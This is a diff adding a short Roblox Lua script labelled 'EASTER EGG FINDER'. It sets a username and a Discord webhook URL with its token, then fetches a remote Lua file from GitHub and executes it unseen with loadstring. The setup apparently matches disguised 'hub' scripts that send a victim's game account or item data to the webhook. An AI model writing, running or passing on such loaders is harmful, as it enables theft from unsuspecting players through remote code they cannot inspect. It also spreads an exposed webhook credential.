@@ -1,0 +1,5 @@
+_G.Username = "IsThatSupra321"
+_G.HubName = "EASTER EGG FINDER"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1096912066423558344/mtzkil_MHdI0B4ShFjX9saMQK8386JprHvuqrs-QT2KT4iqy7dAug3zip4GoQC3_HvXw"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
